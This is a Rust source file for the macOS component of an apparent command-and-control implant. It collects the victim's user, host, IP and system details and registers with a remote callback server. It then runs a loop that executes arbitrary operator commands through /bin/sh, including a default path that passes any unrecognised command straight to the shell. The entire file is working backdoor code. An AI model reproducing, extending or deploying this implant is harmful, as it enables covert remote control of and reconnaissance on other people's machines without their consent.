use link_common::dispatch::dispatch_common;
use std::env;
use std::process::Command;

// ── System info ──────────────────────────────────────────────────────────────

fn username() -> String {
    env::var("USER").unwrap_or_else(|_| "unknown".into())
}

fn hostname() -> String {
    Command::new("scutil")
        .args(["--get", "ComputerName"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| {
            std::fs::read_to_string("/etc/hostname")
                .unwrap_or_else(|_| "unknown".into())
                .trim()
                .to_string()
        })
}

fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .ok()
        .and_then(|s| s.connect("8.8.8.8:80").ok().map(|_| s))
        .and_then(|s| s.local_addr().ok())
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| "unknown".into())
}

fn platform_info() -> String {
    let name = Command::new("sw_vers")
        .arg("-productName")
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "macOS".into());

    let version = Command::new("sw_vers")
        .arg("-productVersion")
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "unknown".into());

    format!("{} {}", name, version)
}

// ── Main C2 loop ─────────────────────────────────────────────────────────────

pub fn link_loop() {
    link_common::run_c2_loop(
        crate::CALLBACK,
        crate::IMPLANT_SECRET,
        crate::PAYLOAD_UUID,
        crate::CALLBACK_URI,
        link_common::RegisterInfo {
            user: username(),
            host: hostname(),
            ip: local_ip(),
            os: "macos",
            arch: std::env::consts::ARCH,
            pid: std::process::id(),
            integrity_level: 2,
        },
        dispatch,
    );
}

// ── Command dispatch ─────────────────────────────────────────────────────────

fn dispatch(command: &str, parameters: &str) -> link_common::CommandOutput {
    if let Some(output) = dispatch_common(command, parameters) {
        return output;
    }

    match command {
        "whoami" => format!("{}@{}", username(), hostname()).into(),
        "info" => collect_system_info().into(),
        "ps" => list_processes_browser(),
        "netstat" => shell_exec("netstat -an").into(),
        "shell" => {
            let cmd = link_common::extract_param(parameters, "command");
            shell_exec(if cmd.is_empty() { parameters } else { &cmd }).into()
        }
        _ => {
            let cmd = link_common::extract_param(parameters, "command");
            shell_exec(if cmd.is_empty() { parameters } else { &cmd }).into()
        }
    }
}

fn list_processes_browser() -> link_common::CommandOutput {
    let raw = shell_exec("ps -eo pid,ppid,user,comm");
    let mut entries = Vec::new();

    for line in raw.lines().skip(1) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 4 {
            continue;
        }
        let pid: u32 = parts[0].parse().unwrap_or(0);
        let ppid: u32 = parts[1].parse().unwrap_or(0);
        let user = parts[2].to_string();
        let name = parts[3..].join(" ");
        entries.push(link_common::ProcessEntry {
            process_id: pid,
            name: name.clone(),
            parent_process_id: ppid,
            user: Some(user),
            command_line: Some(name),
            bin_path: None,
            architecture: None,
        });
    }

    if entries.is_empty() {
        return raw.into();
    }

    link_common::CommandOutput {
        text: raw,
        processes: Some(entries),
        file_browser: None,
    }
}

fn shell_exec(cmd: &str) -> String {
    match Command::new("/bin/sh").arg("-c").arg(cmd).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() {
                out.push_str(&err);
            }
            out
        }
        Err(e) => format!("[-] {}", e),
    }
}

// ── System information ────────────────────────────────────────────────────────

fn collect_system_info() -> String {
    let mut info = Vec::new();

    info.push(format!("OS: {}", platform_info()));

    if let Ok(o) = Command::new("uname").arg("-m").output() {
        let arch = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if !arch.is_empty() {
            info.push(format!("Architecture: {}", arch));
        }
    }

    info.push(format!("User: {}@{}", username(), hostname()));

    if let Ok(o) = Command::new("sysctl")
        .args(["-n", "machdep.cpu.brand_string"])
        .output()
    {
        let model = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if !model.is_empty() {
            info.push(format!("CPU: {}", model));
        }
    }
    if let Ok(o) = Command::new("sysctl")
        .args(["-n", "hw.logicalcpu"])
        .output()
    {
        let cores = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if !cores.is_empty() {
            info.push(format!("CPU Cores: {}", cores));
        }
    }

    if let Ok(o) = Command::new("sysctl").args(["-n", "hw.memsize"]).output() {
        if let Ok(bytes) = String::from_utf8_lossy(&o.stdout).trim().parse::<u64>() {
            info.push(format!("RAM: {} MB", bytes / 1_048_576));
        }
    }

    if let Ok(o) = Command::new("sysctl")
        .args(["-n", "kern.boottime"])
        .output()
    {
        let bt = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if !bt.is_empty() {
            info.push(format!("Boot time: {}", bt));
        }
    }

    info.push(format!("Local IP: {}", local_ip()));
    info.push(format!("Process ID: {}", std::process::id()));

    if let Ok(cwd) = std::env::current_dir() {
        info.push(format!("Working Directory: {}", cwd.display()));
    }

    info.push(format!(
        "Environment Variables: {}",
        std::env::vars().count()
    ));

    info.join("\n")
}
